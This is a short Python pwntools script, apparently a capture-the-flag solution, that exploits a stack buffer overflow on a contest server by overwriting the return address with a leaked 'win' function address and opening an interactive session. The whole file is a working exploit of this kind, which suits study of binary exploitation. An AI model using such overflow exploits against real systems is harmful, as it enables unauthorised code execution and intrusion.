#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

HOST = "overflow.challenges2.ctf.dscjssstuniv.in"
PORT = 9001

io = remote(HOST, PORT)

io.recvuntil(b"Buffer address: ")
io.recvline()

io.recvuntil(b"Secret function address: ")
win_addr = int(io.recvline().strip(), 16)

offset = 120
payload = b"A"*offset + p64(win_addr)

io.sendline(payload)

io.interactive()
